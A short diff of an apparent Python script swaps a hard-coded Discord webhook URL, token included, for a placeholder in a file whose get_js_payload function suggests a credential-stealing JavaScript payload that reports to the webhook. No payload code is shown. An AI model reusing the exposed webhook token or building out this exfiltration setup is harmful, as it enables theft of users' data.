@@ -7,7 +7,7 @@ import pathlib
 import glob
 
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1500860756202225744/5FrOu1nqAo32uIKqLzoBwshHAXqoFFOab7bCpvM9Ili1iepVWMHqsuY3OOBXCVbcCAFA"
+WEBHOOK_URL = "put ur webhook here"
 
 
 def get_js_payload(webhook_url: str) -> str:
